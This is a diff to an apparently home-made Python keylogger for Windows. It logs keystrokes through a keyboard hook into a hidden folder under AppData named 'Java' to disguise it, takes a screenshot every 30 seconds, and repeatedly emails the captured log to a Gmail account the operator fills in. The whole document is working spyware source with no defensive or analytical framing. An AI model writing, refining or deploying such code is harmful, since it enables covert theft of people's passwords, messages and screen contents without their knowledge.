@@ -15,6 +15,13 @@ if not os.path.exists(home + "//Appdata//Roaming//Java//"):
 open(home + "//Appdata//Roaming//Java//" + 'log.txt', 'a')
 file_log = home + "//Appdata//Roaming//Java//" + 'log.txt'
 
+while True:
+	screenshot = ImageGrab.grab()
+	now = time.time()
+	filenamepic = home + "//Appdata//Roaming//Java//" + "%.6f.png" % now
+	screenshot.save(filenamepic)
+	time.sleep(30)
+
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     chr(event.Ascii)
@@ -25,23 +32,18 @@ hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
 
-while True:
-	screenshot = ImageGrab.grab()
-	now = time.time()
-	filenamepic = home + "//Appdata//Roaming//Java//" + "%.6f.png" % now
-	screenshot.save(filenamepic)
-	time.sleep(300)
+def update(mail):
+    while True:
+        mail(to, subject, text, attach)
+        time.sleep(5)
+
+
 	
 gmail_user = "" #enter receiving gmail address here
 gmail_pwd = "" #enter gmail address password here
 
-def update():
-    import time
-    while True:
-        mail(to, subject, text, attach)
-        time.sleep(5)
-		
 
+		
 def mail(to, subject, text, attach):
    msg = MIMEMultipart()
 
@@ -64,12 +66,16 @@ def mail(to, subject, text, attach):
    mailServer.ehlo()
    mailServer.login(gmail_user, gmail_pwd)
    mailServer.sendmail(gmail_user, to, msg.as_string())
-   # Should be mailServer.quit(), but that crashes...
    mailServer.close()
+
+
+        
 
 mail("",#enter gmail receiver email address here
    "SUBJECT HERE",
-   "BODY HERE",
-    home + "//Appdata//Roaming//Java//" + 'log.txt')
+   "BODY HERE", 
+    home + "//Appdata//Roaming//Java//log.txt" )
 
-update()
+update(mail)
+
+
